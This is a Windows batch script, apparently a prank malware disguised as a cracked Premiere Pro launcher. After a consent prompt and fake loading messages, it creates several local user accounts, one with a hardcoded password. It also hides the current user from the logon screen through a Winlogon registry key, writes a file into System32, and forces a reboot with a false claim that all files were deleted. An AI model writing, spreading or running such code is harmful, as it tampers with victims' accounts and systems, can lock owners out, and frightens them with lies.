@echo off
BREAK=OFF
choice /C YN /M "This is a malware. It will delete all your files. And restart your computer several times. Do you want to continue? (Y/N)"
if errorlevel 2 exit
if errorlevel 1 echo So you chose to proceed. Good luck!
echo Openinng cracked software...
timeout /t 1
echo Loading assets...
timeout /t 2
echo Initializing...
timeout /t 1
echo Oops! Something went wrong...
timeout /t 1
color 4
echo You really thought you can get Free Premier Pro?
timeout /t 3
echo Connecting with Adobe servers...
timeout /t 2
echo Calculating your punishment...
timeout /t 3
echo Say goodbye to all your files!
timeout /t 1
echo FEEL THE RAGE OF ADOBE! FEEL PAIN AND REALIZE WHAT YOU HAVE DONE!
timeout /t 3
net user Adobe_(PW: PremierProSux) PremierProSux /add
net user Piracy %username% /add
net user is %username% /add
net user not %username% /add
net user a %username% /add
net user game %username% /add
set "username=%username%"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %username% /t REG_DWORD /d 0 /f
(
echo @echo off
echo echo hello world
echo pause
) > C:\Windows\System32\2_fp.bat
shutdown /r /t 10 /c "Your computer is being restarted by Adobe Systems. All your files have been deleted due to software piracy. Piracy is a crime."